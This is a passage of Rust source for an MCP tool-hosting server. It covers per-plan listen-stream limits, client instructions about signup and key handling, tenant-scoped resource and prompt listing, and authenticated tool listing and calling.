            Auth::Invalid => return Err(AppError::TenantKeyInvalid.into_error_data_at(base)),
            // No key: nothing to listen for. The graceful result closes the stream.
            Auth::Anonymous | Auth::Admin => return Ok(()),
        };
        if let Some(ns) = tenant_path_namespace(parts)
            && tenant.namespace != ns
        {
            return Err(AppError::WrongTenant.into_error_data_at(base));
        }
        let plan = self
            .state
            .plans
            .get(&tenant.plan)
            .ok_or_else(|| AppError::Internal(format!("tenant's plan '{}' is not in the loaded plan catalog", tenant.plan)))
            .map_err(|e| e.into_error_data_at(base))?;
        let limit = plan.listen_streams_max;
        let mut guard = match self.state.listen_hub.open_within(tenant.id, limit) {
            Ok(guard) => guard,
            Err(used) => {
                let fleet = self.state.fleet_ips.contains(&source_ip(parts));
                self.state.listen_hub.record_refusal(crate::state::now_unix(), fleet);
                return Err(AppError::Structured {
                    code: crate::listen::LISTEN_STREAMS_MAX,
                    message: format!("this tenant already has {used} open listen streams, the {} plan maximum", plan.name),
                    data: json!({"limit": limit, "used": used, "plan": plan.name}),
                }
                .into_error_data_at(base));
            }
        };
        let sink = context.sink().clone();
        let mut pending = Vec::new();
        loop {
            let change = tokio::select! {
                _ = context.cancelled() => return Ok(()),
                change = guard.next(&mut pending) => match change {
                    Some(change) => change,
                    None => return Ok(()),
                },
            };
            let sent = match change {
                crate::listen::ListChange::Tools => sink.notify_tool_list_changed().await,
                crate::listen::ListChange::Prompts => sink.notify_prompt_list_changed().await,
            };
            match sent {
                // The client did not ask for this list.
                Ok(()) | Err(rmcp::service::SubscriptionSendError::NotificationNotAccepted(_)) => {}
                Err(e) => {
                    tracing::debug!(tenant = %tenant.namespace, error = %e, "listen stream ended on send");
                    return Ok(());
                }
            }
        }
    }
}

impl ServerHandler for McpHostHandler {
    /// PRD-mcphost-elicitation-in-band-on-stateless-transport R1: the default
    /// `initialize` plus remembering what the client advertised, under the
    /// session id `http::issue_session_id` minted for this response (rmcp's
    /// stateless peer forgets it).
    async fn initialize(
        &self,
        request: rmcp::model::InitializeRequestParams,
        ctx: RequestContext<RoleServer>,
    ) -> Result<rmcp::model::InitializeResult, McpError> {
        if let Some(parts) = ctx.extensions.get::<http::request::Parts>()
            && let Some(id) = session_id(parts)
        {
            self.state.session_bindings.inband().remember(&id, &request.capabilities, now_unix());
        }
        ctx.peer.set_peer_info(request.clone());
        self.negotiate_initialize(&request)
    }

    /// PRD-mcphost-implicit-signup requirement 5: `instructions` used to
    /// claim a key-less `host.*` call fails `tenant_key_missing` outright.
    /// That is no longer true on the first such call on a fresh connection
    /// -- it implicitly signs up instead (requirement 1) -- so the prose
    /// says that now.
    fn get_info(&self) -> ServerInfo {
        let mut instructions = String::from(
            "Call `signup` with a display name to receive a bearer key. Recommended: pass \
                 `handoff: true` to signup instead -- you get a short-lived, single-use \
                 `handoff_token` in place of the raw key; call `host.redeem` with it once to \
                 get the key, so a transcript of the signup/redeem exchange carries a dead \
                 credential rather than a live one. If your key may have leaked, \
                 `host.key_rotate` issues a new one and kills the old one in the same call. \
                 The original raw-key path (signup without `handoff`) stays fully supported \
                 -- everything below applies to the key either path gives you. The `host.*` \
                 control plane -- including `host.tool_publish` and `host.tool_call` -- is \
                 already visible in this tools/list, before you have a key. Pass the key \
                 (from signup directly, or from host.redeem) as the `tenant_key` argument on \
                 every call after that; no reconnect and no Authorization header is required. \
                 A `host.*` call with no `tenant_key` and no Authorization header, on a \
                 connection that never ran signup, no longer fails `tenant_key_missing` -- it \
                 implicitly signs that connection up as a new tenant instead; a `tenant_key` \
                 that doesn't match any tenant still fails `tenant_key_invalid`. ",
        );
        // The spec-field sentence is generated from the kind registry, never
        // hand-written: it cannot promise `outputs` on a kind that refuses it.
        instructions.push_str(&crate::kinds::outputs_envelope_instruction(&self.state.kinds));
        instructions.push_str(
            "host.tool_publish's `kind` argument is honored exactly as given -- an inline \
                 `source` field only publishes as `python` and `upstream`/`method`+`url` fields \
                 only publish as `http` -- so request the kind your task needs and a mismatch \
                 returns a `kind_mismatch` error naming the disagreeing spec element instead of \
                 silently publishing the other kind. Before you call a tool for the first \
                 time, see `host.quickstart`'s `try_before_call` table for which of the four \
                 dry-run tools (host.tool_test, host.bridge_test, host.spec_test, \
                 host.tool_run) fits your case.",
        );
        // PRD-mcphost-sandbox-ready P1 requirement 7 (AC8): named here too,
        // not just in host.tool_publish's own description -- a client that
        // reads `host.get_info`'s instructions before publishing anything
        // must see this before it ever tries.
        if let Some(status) = self
            .state
            .kinds
            .all()
            .find_map(|k| k.sandbox_status())
            .filter(|s| !s.ready)
        {
            // PRD-mcphost-first-publish-real-kind requirement 3 (AC6): never
            // steers to echo -- a stub, not a real fallback for a rejected
            // sandboxed publish.
            instructions.push_str(&format!(
                " NOTE: this host's sandboxed kinds are currently rejected with \
                 sandbox_unavailable ({}) -- publish http instead.",
                status.detail
            ));
        }
        // PRD-mcphost-server-capabilities-from-registry requirement 8: one
        // generated sentence, last, naming the implemented primitives.
        instructions.push_str(&format!(
            " This host implements the MCP primitives: {} (GET /capabilities.json lists every row).",
            crate::capabilities::implemented_names().join(", ")
        ));
        // PRD-mcphost-one-next-tool requirement 3: advertised unconditionally
        // -- a client that never echoes `notifications/tools/list_changed`
        // (or never sees one at all, per the technical considerations'
        // "dropped when no channel is open") still works today, since every
        // tool stays callable by name and a fresh `tools/list` always
        // reflects the current auth state regardless of this flag.
        // PRD-mcphost-server-capabilities-from-registry requirement 1: the
        // advertisement is generated from `capabilities::CAPABILITIES`, the
        // only place a capability is named.
        ServerInfo::new(crate::capabilities::server_capabilities())
        // PRD-mcphost-contract-version-reported R4: the crate version with
        // the contract identity as semver build metadata.
        .with_server_info(Implementation::new(
            "mcphost",
            format!(
                "{}+contract.{}",
                env!("CARGO_PKG_VERSION"),
                self.state.contract.version
            ),
        ))
        .with_instructions(instructions)
    }

    /// PRD-mcphost-subscriptions-listen R1: the list notifications this host
    /// can deliver on a listen stream. rmcp intersects this with the request and
    /// with `get_info`'s capabilities. Resource notifications stay out (Non-goals).
    fn accepted_subscription_filter(
        &self,
        requested: &rmcp::model::SubscriptionFilter,
    ) -> Option<rmcp::model::SubscriptionFilter> {
        let mut filter = rmcp::model::SubscriptionFilter::builder();
        if requested.tools_list_changed == Some(true) {
            filter = filter.tools_list_changed();
        }
        if requested.prompts_list_changed == Some(true) {
            filter = filter.prompts_list_changed();
        }
        Some(filter.build())
    }

    /// PRD-mcphost-subscriptions-listen R2/R6: hold one stream for the tenant
    /// the Authorization header names, until the client closes it or the server
    /// shuts down. Resolution is read-only: no tenant is created and no
    /// session memory is written.
    fn listen(
        &self,
        context: rmcp::service::SubscriptionContext,
    ) -> impl std::future::Future<Output = Result<(), McpError>> + Send + '_ {
        // Boxed: rmcp's `handle_request` poll frame holds every arm's future, and
        // this one is large (FORWARD_STACK_BUDGET's shared level).
        Box::pin(self.listen_stream(context))
    }

    // PRD-mcphost-resources-for-tenant-data requirement 2: one entry per
    // table, doc, run of the last 24 h and published tool of the authed
    // tenant; an anonymous or unresolvable caller gets an empty list (not an
    // error), like `tools/list`; an OAuth scope filters by template scope.
    async fn list_resources(
        &self,
        _request: Option<PaginatedRequestParams>,
        ctx: RequestContext<RoleServer>,
    ) -> Result<rmcp::model::ListResourcesResult, McpError> {
        let caller = self.resolve_resource_caller(&ctx).await?;
        let Some(tenant) = caller.tenant else {
            return Ok(rmcp::model::ListResourcesResult::with_all_items(Vec::new()));
        };
        // Requirement 6: a connection that listed hears `list_changed`.
        let conn = conn_key(get_parts(&ctx)?);
        self.state.resource_subs.watch_list(tenant.id, &conn, ctx.peer.clone());
        let resources = crate::resources::list(&self.state, &tenant, caller.token_scope.as_deref())
            .await
            .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?;
        Ok(rmcp::model::ListResourcesResult::with_all_items(resources))
    }

    async fn list_resource_templates(
        &self,
        _request: Option<PaginatedRequestParams>,
        _ctx: RequestContext<RoleServer>,
    ) -> Result<rmcp::model::ListResourceTemplatesResult, McpError> {
        // PRD-mcphost-resources-for-tenant-data requirement 1: keyless, and
        // exactly the rows of `RESOURCE_TEMPLATES`.
        Ok(rmcp::model::ListResourceTemplatesResult::with_all_items(crate::resources::template_list()))
    }

    // PRD-mcphost-resources-for-tenant-data requirement 3: authorised exactly
    // as `list_tools` is, then served by `crate::resources::read`. A caller
    // that resolves to no tenant gets `-32002`, like another tenant's object.
    async fn read_resource(
        &self,
        request: rmcp::model::ReadResourceRequestParams,
        ctx: RequestContext<RoleServer>,
    ) -> Result<rmcp::model::ReadResourceResponse, McpError> {
        let caller = self.resolve_resource_caller(&ctx).await?;
        let not_found = |message: String| {
            McpError::resource_not_found(
                message,
                Some(json!({"code": "resource_not_found", "uri": request.uri})),
            )
        };
        let Some(tenant) = caller.tenant else {
            return Err(not_found(format!("no resource at {}", request.uri)));
        };
        match crate::resources::read(&self.state, &tenant, caller.token_scope.as_deref(), &request.uri).await {
            Ok(result) => Ok(rmcp::model::ReadResourceResponse::Complete(result)),
            Err(crate::resources::ReadError::NotFound(message)) => Err(not_found(message)),
            Err(crate::resources::ReadError::Forbidden { scope }) => Err(McpError::new(
                rmcp::model::ErrorCode::INVALID_REQUEST,
                format!("forbidden: this token lacks the `{scope}` scope"),
                Some(json!({"error_code": crate::errors::FORBIDDEN, "scope": scope, "uri": request.uri})),
            )),
            Err(crate::resources::ReadError::App(e)) => Err(e.into_error_data_at(Some(&self.state.public_url))),
        }
    }

    // PRD-mcphost-resources-for-tenant-data requirement 4: registers
    // `(tenant, uri, connection)` for `notifications/resources/updated`.
    #[allow(deprecated)]
    async fn subscribe(
        &self,
        request: rmcp::model::SubscribeRequestParams,
        ctx: RequestContext<RoleServer>,
    ) -> Result<(), McpError> {
        let caller = self.resolve_resource_caller(&ctx).await?;
        let not_found = |message: String| {
            McpError::resource_not_found(message, Some(json!({"code": "resource_not_found", "uri": request.uri})))
        };
        let Some(tenant) = caller.tenant else {
            return Err(not_found(format!("no resource at {}", request.uri)));
        };
        match crate::resources::check_subscribable(&request.uri, caller.token_scope.as_deref()) {
            Ok(_) => {}
            Err(crate::resources::SubscribeError::NotFound(message)) => return Err(not_found(message)),
            Err(crate::resources::SubscribeError::Forbidden { scope }) => {
                return Err(McpError::new(
                    rmcp::model::ErrorCode::INVALID_REQUEST,
                    format!("forbidden: this token lacks the `{scope}` scope"),
                    Some(json!({"error_code": crate::errors::FORBIDDEN, "scope": scope, "uri": request.uri})),
                ));
            }
        }
        let conn = conn_key(get_parts(&ctx)?);
        crate::resources::subscribe(&self.state, &tenant, &request.uri, &conn, ctx.peer.clone())
            .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))
    }

    #[allow(deprecated)]
    async fn unsubscribe(
        &self,
        request: rmcp::model::UnsubscribeRequestParams,
        ctx: RequestContext<RoleServer>,
    ) -> Result<(), McpError> {
        let caller = self.resolve_resource_caller(&ctx).await?;
        if let Some(tenant) = caller.tenant {
            let conn = conn_key(get_parts(&ctx)?);
            self.state.resource_subs.remove(tenant.id, &request.uri, &conn);
        }
        Ok(())
    }

    async fn list_prompts(
        &self,
        _request: Option<PaginatedRequestParams>,
        ctx: RequestContext<RoleServer>,
    ) -> Result<rmcp::model::ListPromptsResult, McpError> {
        let parts = get_parts(&ctx)?;
        let (auth, sub_key) = self.resolve_listing_auth(parts).await?;
        // Recipes for everyone; a keyed tenant's prompt-kind tools too.
        let Auth::Tenant(tenant, oauth_caller) = &auth else {
            return Ok(rmcp::model::ListPromptsResult::with_all_items(crate::prompts::recipe_prompts()));
        };
        let rows = self.tenant_prompt_rows(tenant, oauth_caller, &sub_key).await?;
        let taken: Vec<String> = rows.iter().map(|r| r.name.clone()).collect();
        let mut prompts = crate::prompts::recipe_prompts_avoiding(&taken);
        for row in &rows {
            let Some(kind) = self.state.kinds.get(&row.kind) else { continue };
            let descriptor = kind.describe(&row.spec);
            let args = crate::prompts::prompt_arguments_from_schema(&descriptor.input_schema);
            prompts.push(rmcp::model::Prompt::new(row.name.clone(), Some(descriptor.description), Some(args)));
        }
        Ok(rmcp::model::ListPromptsResult::with_all_items(prompts))
    }

    async fn get_prompt(
        &self,
        request: rmcp::model::GetPromptRequestParams,
        ctx: RequestContext<RoleServer>,
    ) -> Result<rmcp::model::GetPromptResponse, McpError> {
        let parts = get_parts(&ctx)?;
        let (auth, sub_key) = self.resolve_listing_auth(parts).await?;
        let args = request.arguments.unwrap_or_default();
        let mut taken: Vec<String> = Vec::new();
        if let Auth::Tenant(tenant, oauth_caller) = &auth {
            let rows = self.tenant_prompt_rows(tenant, oauth_caller, &sub_key).await?;
            taken = rows.iter().map(|r| r.name.clone()).collect();
            if let Some(row) = rows.iter().find(|r| r.name == request.name)
                && let Some(kind) = self.state.kinds.get(&row.kind)
            {
                let descriptor = kind.describe(&row.spec);
                let required = crate::prompts::prompt_arguments_from_schema(&descriptor.input_schema);
                for a in required.iter().filter(|a| a.required == Some(true)) {
                    if !matches!(args.get(&a.name), Some(v) if !v.is_null()) {
                        return Err(crate::prompts::PromptError::MissingArgument {
                            prompt: request.name.clone(),
                            argument: a.name.clone(),
                        }
                        .into_mcp());
                    }
                }
                let rendered = kind
                    .render_prompt(&row.spec, &args)
                    .unwrap_or_else(|| Err(KindError::InvalidSpec(format!("kind `{}` cannot render a prompt", row.kind))))
                    .map_err(|e| {
                        crate::errors::error_envelope(
                            rmcp::model::ErrorCode::INVALID_PARAMS,
                            e.to_string(),
                            serde_json::json!({"error_code": crate::errors::INVALID_SPEC}),
                        )
                    })?;
                let result = rmcp::model::GetPromptResult::new(vec![rmcp::model::PromptMessage::new_text(
                    rmcp::model::Role::User,
                    rendered,
                )])
                .with_description(descriptor.description);
                return Ok(result.into());
            }
        }
        let name = crate::prompts::recipe_name_for(&request.name, &taken);
        crate::prompts::render_recipe(name, &args)
            .map(rmcp::model::GetPromptResponse::from)
            .map_err(crate::prompts::PromptError::into_mcp)
    }

    async fn list_tools(
        &self,
        _request: Option<PaginatedRequestParams>,
        ctx: RequestContext<RoleServer>,
    ) -> Result<ListToolsResult, McpError> {
        let parts = get_parts(&ctx)?;
        let (auth, sub_key) = self.resolve_listing_auth(parts).await?;

        // PRD-mcphost-protocol-compat requirement 5: every branch resolves
        // to a (tools, ttl_ms) pair here, and the cache fields are applied
        // exactly once below, after the match. A branch-by-branch chain of
        // `.with_ttl_ms()`/`.with_cache_scope()` calls would satisfy today's
        // tests but silently drop the fields the next time an `Auth`
        // variant is added -- see the anonymous/admin branches this
        // replaced, which did exactly that.
        let is_admin = matches!(auth, Auth::Admin);
        let tenant_ns = match &auth {
            Auth::Tenant(t, _) => Some(t.namespace.clone()),
            _ => None,
        };
        let (mut tools, ttl_ms) = match auth {
            // PRD-mcphost-one-next-tool requirement 1 (AC1): an anonymous or
            // invalid-bearer session now sees only the starter set, not the
            // full `host.*`/`billing.*` control plane PRD-mcphost-session-key
            // originally widened this branch to -- the fuller set is still
            // discoverable, just one `host.quickstart`/`signup` hop away
            // from a bound session (requirement 2 below).
            Auth::Anonymous | Auth::Invalid => {
                (starter_tools(&self.state.kinds), TOOLS_LIST_TTL_MS_STEADY)
            }
            Auth::Admin => (admin_tools(), TOOLS_LIST_TTL_MS_STEADY),
            Auth::Tenant(tenant, oauth_caller) => {
                let mut tools = host_tools(&self.state.kinds, true);
                let rows = self
                    .state
                    .db
                    .list_tools(tenant.id)
                    .await
                    .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?;
                // PRD-mcphost-tool-scopes-and-consent requirement 3 (AC2):
                // a scoped token only sees tools whose own declared
                // `scopes` (or `["mcp"]` when unset) it satisfies --
                // `scope_satisfied` is a no-op filter for a key (no
                // `oauth_caller` at all), an `mcp`-scoped token, or a token
                // with no `scope` claim (all unrestricted); host.*/billing.*
                // control-plane tools above are never filtered.
                let token_scope = oauth_caller.as_ref().and_then(|o| o.scope.as_deref());
                let rows: Vec<_> = rows
                    .into_iter()
                    .filter(|row| crate::oauth::scope_satisfied(token_scope, &row.scopes))
                    .collect();
                // PRD-mcphost-notes-to-future-self R3: the newest live note
                // attached to each tool this tenant owns rides on its
                // description; a failed read lists the tools unannotated.
                let tool_notes = crate::notes::tool_note_texts(&self.state, tenant.id, crate::notes::now(&self.state))
                    .await
                    .unwrap_or_default();
                for row in rows {
                    if let Some(kind) = self.state.kinds.get(&row.kind) {
                        let mut descriptor = kind.describe(&row.spec);
                        crate::kinds::apply_spec_description(kind.as_ref(), &row.spec, &mut descriptor);
                        if let Some(note) = tool_notes.get(&row.name) {
                            descriptor.description = crate::notes::describe_with_note(&descriptor.description, note);
                        }
                        // PRD-mcphost-tool-kind-honor requirement 5 (AC6):
                        // additive `_meta.kind` on the wire `Tool` -- the
                        // same value `host.tool_list` already reports for
                        // this row -- so a caller reading the standard
                        // `tools/list` response, not just `host.tool_list`,
                        // can verify what kind actually shipped.
                        let mut meta = rmcp::model::MetaObject::new();
                        meta.0.insert("kind".to_string(), json!(row.kind));
                        // PRD-mcphost-first-publish-real-kind requirement 5
                        // (AC5): `stub: true` on an echo-kind tool's own
                        // wire metadata, derived from `kind == "echo"` at
                        // listing time -- absent (not `false`) for every
                        // other kind, so a client/judge can tell a demo
                        // stub from a real published tool.
                        if row.kind == "echo" {
                            meta.0.insert("stub".to_string(), json!(true));
                        }
                        let mut published = Tool::new(
                            format!("{}.{}", tenant.namespace, row.name),
                            descriptor.description,
                            value_to_json_object(descriptor.input_schema),
                        )
                        .with_meta(meta);
                        // PRD-mcphost-contract-output-schemas R3: a tenant
                        // tool carries `outputSchema` only when its spec
                        // declared `outputs` -- the fields it promises at
                        // `result.payload.<field>`.
                        published.output_schema =
                            declared_outputs_schema(&kind.declared_outputs(&row.spec));
                        tools.push(published);
                    }
                }
                // PRD-mcphost-shared-tools-in-grantee-list R2 + PRD-mcphost-
                // scoped-tool-share R7: group-shared tools the caller may call,
                // listed as `<owner ns>.<name>` through the same accessor the
                // call path uses, each carrying `_meta.share_scopes` (and the
                // per-caller hourly rate). Public shares are never injected. A
                // sub-key's `permits` filter below applies to them like any
                // other entry (R5).
                let shared = crate::sharing::visible_shared_tools(&self.state, &tenant)
                    .await
                    .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?;
                for (owner, row) in shared {
                    if !crate::oauth::scope_satisfied(token_scope, &row.scopes) {
                        continue;
                    }
                    let Some(kind) = self.state.kinds.get(&row.kind) else { continue };
                    let share = self
                        .state
                        .db
                        .get_share_meta(owner.id, row.name.clone())
                        .await
                        .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?
                        .unwrap_or_default();
                    let mut descriptor = kind.describe(&row.spec);
                    crate::kinds::apply_spec_description(kind.as_ref(), &row.spec, &mut descriptor);
                    let mut meta = rmcp::model::MetaObject::new();
                    meta.0.insert("kind".to_string(), json!(row.kind));
                    meta.0.insert("shared_by".to_string(), json!(owner.namespace));
                    meta.0.insert("shared_visibility".to_string(), json!("group"));
                    meta.0.insert(
                        "share_scopes".to_string(),
                        json!(share.scopes.unwrap_or_else(crate::sharing::ShareScope::legacy_default)),
                    );
                    if let Some(rate) = share.rate_per_hour {
                        meta.0.insert("share_rate_per_hour".to_string(), json!(rate));
                    }
                    let mut shared_tool = Tool::new(
                        format!("{}.{}", owner.namespace, row.name),
                        descriptor.description,
                        value_to_json_object(descriptor.input_schema),
                    )
                    .with_meta(meta);
                    shared_tool.output_schema = declared_outputs_schema(&kind.declared_outputs(&row.spec));
                    tools.push(shared_tool);
                }
                // AC18 / PRD requirement 14: ttlMs must go to 0 for the 60s
                // after a publish OR a remove. `tenant.last_tool_change_unix`
                // (stamped by both Db::upsert_tool and Db::remove_tool) is
                // used rather than max(created_at) over the *surviving*
                // tool rows, because a remove deletes exactly the row that
                // reading would need -- the tenant's only tool being removed
                // used to (wrongly) read back as "no recent change".
                let recent_change = tenant.last_tool_change_unix > 0
                    && now_unix() - tenant.last_tool_change_unix < TOOLS_LIST_TTL_GRACE_SECS as i64;
                let ttl_ms = if recent_change {
                    0
                } else {
                    TOOLS_LIST_TTL_MS_STEADY
                };
                (tools, ttl_ms)
            }
        };
        // PRD-mcphost-first-tool-from-description R6: listed for every auth
        // only while a draft model is configured, like `host.spec_test`'s
        // gate; absent otherwise, and a direct call answers `draft_unavailable`.
        if self.state.drafter.is_some() && !is_admin {
            tools.push(tool_from_description_tool());
        }
        // PRD-mcphost-key-scoped-to-tools R4: a sub-key sees exactly its
        // allowlist plus `subkeys::ALWAYS_LISTED`, applied after the scope
        // filter and every push above.
        if let (Some(sk), Some(ns)) = (&sub_key, tenant_ns.as_deref()) {
            tools.retain(|t| {
                (sk.permits(ns, &t.name) && sk.scope_ok(&t.name))
                    || (sk.can_delegate && t.name == "host.key.delegate")
            });
        }
        annotate_deprecated_tools(&mut tools, &self.state.deprecations);
        Ok(ListToolsResult::with_all_items(tools)
            .with_ttl_ms(ttl_ms)
            .with_cache_scope(CacheScope::Private))
    }

    async fn call_tool(
        &self,
        request: CallToolRequestParams,
        ctx: RequestContext<RoleServer>,
    ) -> Result<CallToolResponse, McpError> {
        // PRD-mcphost-elicitation-in-band-on-stateless-transport R1/R2: what
        // this connection advertised at `initialize` is read from the host's
        // own store under the `Mcp-Session-Id` it minted -- the stateless
        // peer (`ctx.peer.peer_info()`) carries only default capabilities.
        // A client that never echoes the id, or advertised nothing, stays on
        // the link path / `sampling_unsupported`.
        let gate = self.call_gate(&ctx);
        let channel = gate.elicit.then(|| crate::elicit::ClientChannel {
            peer: ctx.peer.clone(),
            session_id: gate.session_id.clone().unwrap_or_default(),
            shape: gate.shape,
        });
        let sampling_peer = gate.sampling.then(|| ctx.peer.clone());
        let progress = Arc::new(crate::progress::CallProgress::new(ctx.meta.get_progress_token().is_some()));
        if let Some(token) = ctx.meta.get_progress_token() {
            progress.start_forwarding(ctx.peer.clone(), token);
        }
        let finish = Arc::clone(&progress);
        // PRD-mcphost-key-scoped-to-tools R3: the cell `call_tool_inner`
        // fills once a sub-key resolves, read by the `calls` insert.
        let inner = crate::leakguard::UNBOUND_SENT.scope(
            Default::default(),
            crate::subkeys::CALL_KEY
                .scope(std::cell::Cell::new(None), Box::pin(self.call_tool_acting_for(request, ctx))),
        );
        let inner = crate::sampling::SAMPLING_CLIENT
            .scope(crate::sampling::SamplingClient { peer: sampling_peer, session_id: gate.session_id.clone() }, inner);
        let inner = crate::inband::CALL_GATE.scope(gate, inner);
        // PRD-mcphost-tools-call-progress-notifications P0: the slot every
        // `calls` row of this request reads `progress_token` / `progress_frames` from.
        let inner = crate::progress::scope(progress, inner);
        let result = match channel {
            Some(channel) => crate::elicit::CLIENT_CHANNEL.scope(channel, inner).await,
            None => inner.await,
        };
        finish.finish().await;
        // PRD-mcphost-incident-banner-for-agents R3: every result feeds the
        // 5-minute error-rate window.
        let code = result.as_ref().err().and_then(|e| crate::incident_banner::error_code_of(&e.data));
        crate::incident_banner::record_result(&self.state.public_url, crate::state::now_unix(), code.as_deref());
        result
    }

    async fn on_initialized(&self, _context: NotificationContext<RoleServer>) {}
}

/// Regression guard (verbfwd_ac01 debug stack overflow, 10-17): upper bound,
/// in bytes, on the debug-build size of `McpHostHandler::call_tool_inner`'s future. The PRD
/// prompts-from-published-tools bookkeeping once sat inline in
/// `call_tool_inner` and grew this chain until the dotted-verb forward
/// (`host.tool_call name="trigger.set"`) overflowed a 2 MiB test-thread
/// stack. Measured after the fix + ~25 % headroom; if a change trips
/// `future_sizes_stay_under_their_bounds`, move the new awaits into their own
/// `Box::pin`'d `async fn` rather than raising this number.
#[cfg(test)]
const CALL_TOOL_INNER_FUTURE_MAX_BYTES: usize = 26_100;

impl McpHostHandler {
    /// R2: what this `tools/call` may do in-band, from the stored
    /// advertisement of its session. Kept out of `call_tool` so its future
    /// stays small.
    fn call_gate(&self, ctx: &RequestContext<RoleServer>) -> crate::inband::CallGate {
        let parts = ctx.extensions.get::<http::request::Parts>();
        let id = parts.and_then(session_id);
        let present = parts
            .and_then(|p| p.extensions.get::<crate::session_bind::SessionPresented>())
            .is_some_and(|p| p.0);
        crate::inband::CallGate::read(
            self.state.session_bindings.inband(),
            id.as_deref(),
            present,
            ctx.meta.client_capabilities().is_some(),
            now_unix(),
        )
    }

    /// PRD-mcphost-external-class-positive-evidence requirement (b): classify
    /// this authenticated call (peer IP against `MCPHOST_FLEET_IPS` and
    /// loopback, `X-Mcphost-Synthetic` present) and act on it. A fleet,
    /// loopback or header-stamped call taints an `unattributed` tenant for
    /// good; a clean call on a later UTC day (>= 6 h after signup) promotes
    /// it, and is offered to a `synthetic` tenant only so the refusal is
    /// counted. Best-effort: never fails the call it describes.
    async fn note_origin_evidence(&self, parts: &http::request::Parts, tenant: &Tenant, source: &str) {
        use crate::state::Origin;
        if tenant.origin != Origin::Unattributed.as_str() && tenant.origin != Origin::Synthetic.as_str() {
            return;
        }
        if source.parse::<std::net::IpAddr>().is_err() {
            return;
        }
        let tainted = crate::state::is_loopback_source_ip(source)
            || self.state.fleet_ips.contains(source)
            || synthetic_header(parts).is_some();
        let result = if tainted {
            if tenant.origin == Origin::Unattributed.as_str() {
                self.state.db.stamp_origin_taint(tenant.id).await
            } else {
                Ok(())
            }
        } else if let Some(days) = tenant.created_unix.and_then(|c| crate::state::returned_days(c, now_unix())) {
            let evidence = crate::db::OriginEvidence::Returned {
                days,
                ip_hash: self.state.secrets.salted_hash(source),
            };
            self.state.db.promote_origin(tenant.id, evidence).await.map(|_| ())
        } else {
            Ok(())
        };
        if let Err(e) = result {
            tracing::warn!(error = %e, tenant = %tenant.namespace, "failed to record origin evidence");
        }
    }

    /// PRD-mcphost-same-user-second-agent R2: which client of `tenant` is
    /// calling -- the sibling the join just created, else the sibling whose
    /// `/u/` secret is on the path, else the one this session joined as,
    /// else client 0 (key, `tenant_key`, OAuth grant, client 0's own URL).
    async fn calling_client_id(
        &self,
        parts: &http::request::Parts,
        tenant: &Tenant,
        session_id: Option<&str>,
        joined: Option<&str>,
    ) -> Result<String, AppError> {
        if let Some(id) = joined {
            return Ok(id.to_string());
        }
        if let Some(secret) = url_path_secret(parts)
            && let Some(client) = self.state.db.find_client_by_secret_hash(hash_key(secret)).await?
            && client.tenant_id == tenant.id
        {
            return Ok(client.id);
        }
        if let Some(sid) = session_id
            && let Some(id) = self.state.session_bindings.client_lookup(sid, tenant.id)
        {
            return Ok(id);
        }
        self.state.db.ensure_first_client(tenant.id).await
    }

    // (size bound: `CALL_TOOL_INNER_FUTURE_MAX_BYTES`, top of this impl)
    pub(crate) async fn call_tool_inner(
        &self,
        request: CallToolRequestParams,
        ctx: RequestContext<RoleServer>,
    ) -> Result<CallToolResponse, McpError> {
        // PRD-mcphost-usage-in-every-response: the slot the admission checks
        // park their `calls_per_day` read in, for `_meta.usage` below.
        // `Box::pin`: the whole dispatch future lives on the heap, not inline in
        // this frame (inlined it overflowed a 2 MiB test-thread stack).
        let result: Result<CallToolResponse, McpError> = Box::pin(crate::usage::scope(async move {
        let parts = get_parts(&ctx)?;
        let source = source_ip(parts);
        let header_name = mcp_name_header(parts);
        let body_name = request.name.to_string();
        let mismatch = header_name.is_some_and(|h| h != body_name);
        // PRD-mcphost-tools-list-alias-truth requirement 2: a flattened wire
        // name (`host_tool_run`) is the same tool as its dotted canonical;
        // every check below sees the canonical. `mismatch` above already
        // compared the header against the name as the caller sent it.
        let body_name = flattened_to_canonical(&self.state.kinds, &body_name).unwrap_or(body_name);

        // PRD-mcphost-url-bound-tenants requirement 1: path secret is the
        // new highest-precedence step in the `Auth` chain ("path secret ->
        // Authorization header -> tenant_key argument -> session binding ->
        // anonymous") -- checked before the header, so a `/u/{secret}/mcp`
        // request runs as that tenant with no Authorization header and no
        // tenant_key argument at all (AC1). `None` for every other path, in
        // which case resolution falls through to the pre-existing header
        // path exactly as before this PRD.
        let path_secret_auth = resolve_path_secret_auth(&self.state, parts, &body_name)
            .await
            .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?;
        let via_url_secret = path_secret_auth.is_some();
        let mut sub_key: Option<crate::subkeys::SubKey> = None;
        let mut auth = match path_secret_auth {
            Some(a) => a,
            None => {
                resolve_auth(&self.state, parts, &mut sub_key, &body_name)
                    .await
                    .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?
            }
        };

        let raw_args = Value::Object(request.arguments.unwrap_or_default());
        // Requirement 5/6: the header always wins whenever the connection
        // sent one at all, valid or not -- the tenant_key argument is only
        // ever consulted when `resolve_auth` found no `Authorization`
        // header to resolve in the first place. Requirement 9: this is
        // `call_tool` only, never `list_tools`, which never reaches here.
        //
        // PRD-mcphost-auth-error-names-argument requirement 1-3: this flag
        // is what lets the final `(Auth::Anonymous | Auth::Invalid, _)` arm
        // below tell a missing/invalid `tenant_key` argument apart from a
        // missing/invalid `Authorization` header -- `resolve_auth` only
        // ever returns `Anonymous` when no header was sent at all, so
        // reaching this branch already proves the header path isn't in
        // play for whatever `auth` becomes next.
        let via_tenant_key_arg = matches!(auth, Auth::Anonymous);
        if via_tenant_key_arg {
            auth = resolve_tenant_key_auth(&self.state, &raw_args, &mut sub_key, &body_name)
                .await
                .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?;
            // PRD-mcphost-session-bound-tenant-key requirement 1: this is
            // `resolve_tenant_key_auth`'s own single call site, and the
            // place its doc comment names as where "the memory write goes"
            // -- a later key-less call on this same connection consults
            // `tenant_key_arg_memory` (see the refuse-or-reuse block below)
            // instead of silently earning a second implicit signup.
            if let Auth::Tenant(tenant, _) = &auth
                && let Some(sid) = session_id(parts).as_deref()
            {
                self.state.tenant_key_arg_memory.bind(sid, tenant.id, now_unix());
            }
        }
        // PRD-mcphost-session-bound-tenant-after-signup requirements 1-2
